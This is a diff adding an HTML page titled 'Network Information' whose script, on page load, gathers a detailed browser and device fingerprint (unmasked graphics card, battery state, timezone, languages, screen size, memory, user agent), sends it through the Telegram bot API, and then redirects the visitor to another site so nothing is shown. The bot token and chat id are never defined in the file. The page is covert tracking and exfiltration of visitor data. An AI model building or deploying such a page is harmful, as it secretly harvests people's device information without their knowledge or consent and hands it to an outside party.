@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Network Information</title>
+  </head>
+<body>
+  
+  <script>
+    
+    document.addEventListener('DOMContentLoaded', function () {
+      const networkInfoElement = document.getElementById('networkInfo');
+      const batteryInfo = navigator.battery || navigator.webkitBattery || navigator.mozBattery;
+      const batteryLevel = batteryInfo ? batteryInfo.level * 100 + '%' : 'Not available';
+      const isCharging = batteryInfo ? batteryInfo.charging : 'Not available';
+      const webpDataURL = document.createElement('canvas').toDataURL('image/webp');
+      const webpSupported = webpDataURL.startsWith('data:image/webp');
+      const userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Not available';
+      const sensorSupport = 'ondeviceorientation' in window ? 'Yes' : 'No';
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      const renderer = gl.getParameter(gl.RENDERER) || 'Not available';
+      const vendor = gl.getParameter(gl.VENDOR) || 'Not available';
+      const rendererInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      const unmaskedRenderer = rendererInfo ? gl.getParameter(rendererInfo.UNMASKED_RENDERER_WEBGL) : 'Not available';
+      const unmaskedVendor = rendererInfo ? gl.getParameter(rendererInfo.UNMASKED_VENDOR_WEBGL) : 'Not available';
+      const processorCount = navigator.hardwareConcurrency || 'Not available';
+      const userAgent = navigator.userAgent || 'Not available';
+      const processorDetails = extractProcessorDetails(userAgent);
+      const memoryInfo = {
+        totalJSHeapSize: (performance.memory && performance.memory.totalJSHeapSize) || 'Not available',
+        usedJSHeapSize: (performance.memory && performance.memory.usedJSHeapSize) || 'Not available',
+        jsHeapSizeLimit: (performance.memory && performance.memory.jsHeapSizeLimit) || 'Not available',
+      };
+      const networkInfo = {
+        connectionType: navigator.connection.type || 'Not available',
+        effectiveConnectionType: navigator.connection.effectiveType || 'Not available',
+        connectionSpeed: navigator.connection.downlink || 'Not available',
+        onlineStatus: navigator.onLine ? 'Online' : 'Offline',
+        screenWidth: window.screen.width || 'Not available',
+        screenHeight: window.screen.height || 'Not available',
+        browserLanguage: navigator.language || 'Not available',
+        platform: navigator.platform || 'Not available',
+        deviceType: navigator.deviceType || 'Not available',
+        browserVersion: navigator.appVersion || 'Not available',
+        languages: navigator.languages ? navigator.languages.join(', ') : 'Not available',
+        userAgent: navigator.userAgent || 'Not available',
+        windowWidth: window.innerWidth || 'Not available',
+        windowHeight: window.innerHeight || 'Not available',
+        screenAvailWidth: window.screen.availWidth || 'Not available',
+        screenAvailHeight: window.screen.availHeight || 'Not available',
+        theme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
+        deviceOrientation: window.orientation || 'Not available',
+        maxTouchPoints: navigator.maxTouchPoints || 'Not available',
+        batteryLevel: batteryLevel,
+        isCharging: isCharging,
+        hasMediaDevices: navigator.mediaDevices && 'enumerateDevices' in navigator.mediaDevices,
+        speechSynthesisSupported: 'speechSynthesis' in window,
+        bluetoothSupported: 'bluetooth' in navigator,
+        webSocketsSupported: 'WebSocket' in window,
+        webRtcSupported: 'RTCPeerConnection' in window,
+        mediaElementSupported: 'HTMLMediaElement' in window,
+        geolocationSupported: 'geolocation' in navigator,
+        cacheApiSupported: 'caches' in window,
+        serviceWorkersSupported: 'serviceWorker' in navigator,
+        webAssemblySupported: 'WebAssembly' in window,
+        localStorageSupported: 'localStorage' in window,
+        webWorkersSupported: 'Worker' in window,
+        mediaDevicesSupported: navigator.mediaDevices && 'getUserMedia' in navigator.mediaDevices,
+        keyboardEventSupported: 'KeyboardEvent' in window,
+        touchpadSupported: 'ontouchstart' in window,
+        borderRadiusSupported: CSS.supports('border-radius', '1px'),
+        webpSupported: webpSupported,
+        requestAnimationFrameSupported: 'requestAnimationFrame' in window,
+        cookiesEnabled: navigator.cookieEnabled,
+        webShareAPISupported: 'share' in navigator,
+        cacheStorageInfo: window.caches && window.caches.keys ? window.caches.keys() : 'Not available',
+        userTimezone: userTimezone,
+        sensorSupport: sensorSupport,
+        graphicsRenderer: renderer,
+        graphicsVendor: vendor,
+        unmaskedRenderer: unmaskedRenderer,
+        unmaskedVendor: unmaskedVendor,
+        processorCount: processorCount,
+        processorManufacturer: processorDetails.manufacturer || 'Not available',
+        processorFrequency: processorDetails.frequency || 'Not available',
+        processorModel: processorDetails.model || 'Not available',
+        totalJSHeapSize: memoryInfo.totalJSHeapSize,
+        usedJSHeapSize: memoryInfo.usedJSHeapSize,
+        jsHeapSizeLimit: memoryInfo.jsHeapSizeLimit,
+      };
+      
+      function extractProcessorDetails(userAgent) {
+        const regex = /(?:Intel|AMD|Apple|ARM|Qualcomm|MediaTek|Samsung)/i;
+        const match = userAgent.match(regex);
+        return {
+          manufacturer: match ? match[0] : null,
+          frequency: null,
+          model: null,
+        };
+      }
+      function sendToTelegram(networkInfo) {
+        
+        const message = formatTelegramMessage(networkInfo);
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+          .then(response => response.json())
+          .then(data => {
+            console.log('Message sent to Telegram:', data);
+          })
+          .catch(error => {
+            console.error('Error sending message to Telegram:', error);
+          });
+      }
+
+      function formatTelegramMessage(networkInfo) {
+        
+        const formattedMessage = `
+          Інформація про мережу та пристрій:
+          Тип мережі: ${networkInfo.connectionType}
+          Ефективний тип мережі: ${networkInfo.effectiveConnectionType}
+          Швидкість з'єднання (Mbps): ${networkInfo.connectionSpeed}
+          Стан з'єднання: ${networkInfo.onlineStatus}
+          Розмір екрану (ширина x висота): ${networkInfo.screenWidth} x ${networkInfo.screenHeight}
+          Мова браузера: ${networkInfo.browserLanguage}
+          Платформа: ${networkInfo.platform}
+          Тип пристрою: ${networkInfo.deviceType}
+          Версія браузера: ${networkInfo.browserVersion}
+          Мови браузера: ${networkInfo.languages}
+          UA-рядок: ${networkInfo.userAgent}
+          Розмір вікна браузера (ширина x висота): ${networkInfo.windowWidth} x ${networkInfo.windowHeight}
+          Доступний розмір екрану (ширина x висота): ${networkInfo.screenAvailWidth} x ${networkInfo.screenAvailHeight}
+          Тема оформлення: ${networkInfo.theme}
+          Орієнтація пристрою: ${networkInfo.deviceOrientation}
+          Підтримка тачскріну: ${networkInfo.maxTouchPoints}
+          Рівень заряду батареї: ${networkInfo.batteryLevel}
+          Заряджається: ${networkInfo.isCharging}
+          Підтримка медіапристроїв: ${networkInfo.hasMediaDevices}
+          Підтримка синтезу мовлення: ${networkInfo.speechSynthesisSupported}
+          Підтримка Bluetooth: ${networkInfo.bluetoothSupported}
+          Підтримка WebSockets: ${networkInfo.webSocketsSupported}
+          Підтримка WebRTC: ${networkInfo.webRtcSupported}
+          Відтворення аудіо та відео: ${networkInfo.mediaElementSupported}
+          Підтримка геолокації: ${networkInfo.geolocationSupported}
+          Підтримка кешу: ${networkInfo.cacheApiSupported}
+          Підтримка Service Workers: ${networkInfo.serviceWorkersSupported}
+          Підтримка WebAssembly: ${networkInfo.webAssemblySupported}
+          Підтримка Local Storage: ${networkInfo.localStorageSupported}
+          Підтримка Web Workers: ${networkInfo.webWorkersSupported}
+          Доступність мікрофону та камери: ${networkInfo.mediaDevicesSupported}
+          Підтримка подій клавіш: ${networkInfo.keyboardEventSupported}
+          Підтримка тачпаду: ${networkInfo.touchpadSupported}
+          Підтримка властивостей CSS (border-radius): ${networkInfo.borderRadiusSupported}
+          Підтримка WebP: ${networkInfo.webpSupported}
+          Підтримка фреймів: ${networkInfo.requestAnimationFrameSupported}
+          Можливість встановлення cookie: ${networkInfo.cookiesEnabled}
+          Підтримка Web Share API: ${networkInfo.webShareAPISupported}
+          Розмір кешу: ${networkInfo.cacheStorageInfo}
+          Часовий пояс: ${networkInfo.userTimezone}
+          Підтримка сенсорів: ${networkInfo.sensorSupport}
+          Графічна карта: ${networkInfo.graphicsRenderer}
+          Виробник графічної карти: ${networkInfo.graphicsVendor}
+          Докладна модель графічної карти: ${networkInfo.unmaskedRenderer}
+          Докладний виробник графічної карти: ${networkInfo.unmaskedVendor}
+          Кількість логічних процесорів: ${networkInfo.processorCount}
+          Виробник процесора: ${networkInfo.processorManufacturer}
+          Частота процесора: ${networkInfo.processorFrequency}
+          Модель процесора: ${networkInfo.processorModel}
+          Загальний обсяг використовуваної пам'яті (JS Heap): ${networkInfo.usedJSHeapSize} bytes
+          Загальний обсяг доступної пам'яті для JS Heap: ${networkInfo.totalJSHeapSize} bytes
+          Ліміт обсягу пам'яті для JS Heap: ${networkInfo.jsHeapSizeLimit} bytes
+      `;
+
+        return formattedMessage;
+      }
+
+      sendToTelegram(networkInfo);
+      window.location.href = "https://gamedev.dou.ua/";
+    });
+  </script>
+</body>
+</html>
